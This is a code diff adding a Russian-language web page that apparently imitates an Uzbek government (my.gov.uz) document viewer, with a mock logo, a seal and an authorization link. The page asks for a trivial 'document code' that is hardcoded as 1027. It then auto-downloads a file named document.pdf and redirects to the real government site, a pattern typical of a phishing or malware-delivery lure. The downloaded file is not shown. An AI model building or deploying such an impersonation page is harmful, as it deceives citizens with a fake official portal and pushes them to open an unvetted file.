@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Просмотр документа</title>
+
+  <style>
+    :root {
+      --blue: #1689b3;
+      --blue-dark: #22617d;
+      --green: #3fad4b;
+      --green-dark: #278735;
+      --text: #1f1f1f;
+      --muted: #6f6f6f;
+      --notice: #fff8e8;
+      --notice-line: #f2e4bd;
+      --page: #ffffff;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: var(--page);
+      color: var(--text);
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .phone-page {
+      width: min(100%, 560px);
+      min-height: 100vh;
+      margin: 0 auto;
+      background: #ffffff;
+    }
+
+    .header {
+      height: 112px;
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      padding: 22px 38px 0;
+    }
+
+    .logo {
+      width: 64px;
+      height: 64px;
+      position: relative;
+    }
+
+    .logo::before,
+    .logo::after {
+      content: "";
+      position: absolute;
+      border-radius: 6px;
+    }
+
+    .logo::before {
+      width: 42px;
+      height: 42px;
+      left: 0;
+      top: 0;
+      background: #65c3c8;
+      box-shadow: 8px 8px 0 #78c24d;
+    }
+
+    .logo::after {
+      width: 46px;
+      height: 46px;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(135deg, #1595c4, #0b72a5);
+      box-shadow: 0 6px 14px rgba(19, 121, 165, 0.24);
+    }
+
+    .check {
+      position: absolute;
+      right: 11px;
+      bottom: 11px;
+      z-index: 2;
+      width: 25px;
+      height: 14px;
+      border-left: 5px solid #ffffff;
+      border-bottom: 5px solid #ffffff;
+      transform: rotate(-45deg);
+    }
+
+    .menu {
+      width: 32px;
+      height: 24px;
+      margin-top: 10px;
+      border: 0;
+      background: transparent;
+      display: grid;
+      gap: 5px;
+      padding: 0;
+    }
+
+    .menu span {
+      display: block;
+      height: 4px;
+      border-radius: 999px;
+      background: var(--blue);
+    }
+
+    .content {
+      padding: 34px 48px 48px;
+    }
+
+    .notice {
+      position: relative;
+      margin: 0 0 28px;
+      padding: 20px 42px 22px 22px;
+      border: 1px solid var(--notice-line);
+      border-radius: 5px;
+      background: var(--notice);
+      color: #776b55;
+      font-size: 20px;
+      line-height: 1.43;
+    }
+
+    .notice button {
+      position: absolute;
+      right: 14px;
+      top: 14px;
+      border: 0;
+      background: transparent;
+      color: #b8ac95;
+      font-size: 30px;
+      line-height: 1;
+      cursor: pointer;
+    }
+
+    .notice a,
+    .official {
+      color: var(--blue-dark);
+      text-decoration: none;
+    }
+
+    .form-block {
+      position: relative;
+    }
+
+    .form-block::before {
+      content: "";
+      position: absolute;
+      left: -40px;
+      top: -2px;
+      width: 4px;
+      height: 96px;
+      border-radius: 999px;
+      background: #d0d0d0;
+    }
+
+    h1 {
+      margin: 0 0 34px;
+      font-size: 22px;
+      line-height: 1.35;
+      font-weight: 500;
+      letter-spacing: 0;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 12px;
+      font-size: 20px;
+      font-weight: 700;
+      color: #303030;
+    }
+
+    input {
+      width: 100%;
+      height: 64px;
+      border: 1px solid #cfcfcf;
+      border-radius: 5px;
+      padding: 0 16px;
+      background: #ffffff;
+      color: #5f5f5f;
+      font-size: 20px;
+      outline: none;
+      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.05);
+    }
+
+    input:focus {
+      border-color: var(--blue);
+      box-shadow: 0 0 0 3px rgba(22, 137, 179, 0.12);
+    }
+
+    .open-btn {
+      width: 100%;
+      height: 64px;
+      margin-top: 38px;
+      border: 2px solid #0e2d12;
+      border-radius: 6px;
+      background: var(--green);
+      color: #ffffff;
+      font-size: 22px;
+      cursor: pointer;
+      box-shadow:
+        inset 0 0 0 2px rgba(255, 255, 255, 0.55),
+        0 2px 0 rgba(0, 0, 0, 0.14);
+    }
+
+    .open-btn:hover {
+      background: var(--green-dark);
+    }
+
+    .status {
+      min-height: 24px;
+      margin-top: 14px;
+      color: var(--muted);
+      font-size: 15px;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .status.error {
+      color: #c92a2a;
+    }
+
+    .status.success {
+      color: var(--green-dark);
+    }
+
+    .hint {
+      margin: 34px 0 0;
+      color: var(--blue-dark);
+      font-size: 20px;
+      line-height: 1.28;
+      font-weight: 500;
+    }
+
+    .document-help {
+      width: 244px;
+      height: 330px;
+      margin: 70px auto 0;
+      background: #ffffff;
+      box-shadow: 0 8px 22px rgba(0, 0, 0, 0.18);
+      position: relative;
+      padding: 22px 14px;
+    }
+
+    .doc-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 22px;
+    }
+
+    .mini-logo {
+      width: 78px;
+      height: 22px;
+      background:
+        linear-gradient(90deg, #1a9cc8 0 34%, transparent 34% 100%),
+        linear-gradient(#cfd3d6, #cfd3d6);
+      background-size: 100% 100%, 70px 4px;
+      background-position: 0 0, 8px 16px;
+      background-repeat: no-repeat;
+      border-radius: 2px;
+    }
+
+    .mini-seal {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background:
+        radial-gradient(circle, #f0ca3e 0 16%, transparent 17%),
+        conic-gradient(#1f9d55, #f0ca3e, #1d8ec1, #1f9d55);
+      opacity: 0.9;
+    }
+
+    .mini-lines {
+      width: 78px;
+      display: grid;
+      gap: 4px;
+      padding-top: 8px;
+    }
+
+    .mini-lines span,
+    .line {
+      height: 5px;
+      background: #babec2;
+    }
+
+    .line {
+      margin-top: 7px;
+    }
+
+    .line.short {
+      width: 70%;
+    }
+
+    .line.mid {
+      width: 84%;
+    }
+
+    .qr-area {
+      position: absolute;
+      right: 14px;
+      bottom: 16px;
+      display: flex;
+      align-items: flex-end;
+      gap: 6px;
+    }
+
+    .pin-sample {
+      writing-mode: vertical-rl;
+      transform: rotate(180deg);
+      border: 2px solid #d72d2d;
+      color: #333333;
+      font-size: 12px;
+      letter-spacing: 1px;
+      padding: 2px 1px;
+      background: #ffffff;
+    }
+
+    .qr {
+      width: 46px;
+      height: 46px;
+      background:
+        linear-gradient(90deg, #000 50%, transparent 50%),
+        linear-gradient(#000 50%, transparent 50%);
+      background-size: 8px 8px;
+      border: 3px solid #111111;
+      image-rendering: pixelated;
+    }
+
+    .arrow {
+      position: absolute;
+      right: 52px;
+      bottom: 80px;
+      width: 54px;
+      height: 2px;
+      background: #e22121;
+      transform: rotate(48deg);
+      transform-origin: right center;
+    }
+
+    .arrow::after {
+      content: "";
+      position: absolute;
+      right: -2px;
+      top: -5px;
+      width: 0;
+      height: 0;
+      border-top: 6px solid transparent;
+      border-bottom: 6px solid transparent;
+      border-left: 12px solid #e22121;
+    }
+
+    .official-row {
+      margin-top: 26px;
+      color: #7a7a7a;
+      font-size: 13px;
+      text-align: center;
+    }
+
+    @media (max-width: 520px) {
+      .header {
+        height: 118px;
+        padding: 20px 30px 0;
+      }
+
+      .content {
+        padding: 30px 38px 44px;
+      }
+
+      .notice {
+        font-size: 19px;
+      }
+
+      .form-block::before {
+        left: -30px;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .content {
+        padding-left: 30px;
+        padding-right: 30px;
+      }
+
+      .form-block::before {
+        left: -22px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="phone-page">
+    <header class="header">
+      <div class="logo" aria-hidden="true">
+        <span class="check"></span>
+      </div>
+
+      <button class="menu" type="button" aria-label="Меню">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+    </header>
+
+    <section class="content">
+      <div class="notice" id="notice">
+        <button type="button" aria-label="Закрыть" id="closeNotice">&times;</button>
+        Пожалуйста, пройдите авторизацию, чтобы система определила вас.
+        Если документ принадлежит вам, введения кода не требуется.
+        <a href="https://id.egov.uz/oz?client_id=mygove_uz_test&amp;token_id=2a3820fe-9eb5-4b36-b1ac-d2143d45c8a1&amp;method=IDPW" target="_blank" rel="noopener noreferrer">Нажмите здесь для авторизации</a>
+      </div>
+
+      <div class="form-block">
+        <h1>Введите код для просмотра документа</h1>
+
+        <form id="codeForm">
+          <label for="accessCode">Код документа</label>
+          <input
+            id="accessCode"
+            type="password"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            placeholder="1027"
+            required
+          >
+
+          <button class="open-btn" type="submit">Открыть</button>
+        </form>
+
+        <div class="status" id="status" role="status" aria-live="polite"></div>
+      </div>
+
+      <p class="hint">Код размещается рядом с QR-кодом документа</p>
+
+      <div class="document-help" aria-hidden="true">
+        <div class="doc-head">
+          <div class="mini-logo"></div>
+          <div class="mini-seal"></div>
+          <div class="mini-lines">
+            <span></span>
+            <span></span>
+          </div>
+        </div>
+
+        <div class="line mid"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line"></div>
+        <div class="line short"></div>
+        <div class="line"></div>
+        <div class="line mid"></div>
+        <div class="line short"></div>
+
+        <div class="arrow"></div>
+        <div class="qr-area">
+          <div class="pin-sample">XYZ4</div>
+          <div class="qr"></div>
+        </div>
+      </div>
+
+      <div class="official-row">
+        Официальный сайт:
+        <a class="official" href="https://my.gov.uz" target="_blank" rel="noopener noreferrer">my.gov.uz</a>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    const correctCode = "1027";
+    const pdfFile = "document.pdf";
+    const redirectUrl = "https://my.gov.uz";
+    const redirectDelayMs = 1500;
+
+    const form = document.getElementById("codeForm");
+    const input = document.getElementById("accessCode");
+    const status = document.getElementById("status");
+    const notice = document.getElementById("notice");
+    const closeNotice = document.getElementById("closeNotice");
+
+    closeNotice.addEventListener("click", function () {
+      notice.style.display = "none";
+    });
+
+    function downloadPdf() {
+      const link = document.createElement("a");
+
+      link.href = pdfFile;
+      link.download = pdfFile;
+      link.style.display = "none";
+
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      if (input.value.trim() !== correctCode) {
+        status.className = "status error";
+        status.textContent = "Код введен неверно. Попробуйте еще раз.";
+        input.select();
+        return;
+      }
+
+      status.className = "status success";
+      status.textContent = "Код подтвержден. PDF скачивается...";
+      downloadPdf();
+
+      window.setTimeout(function () {
+        window.location.href = redirectUrl;
+      }, redirectDelayMs);
+    });
+  </script>
+</body>
+</html>
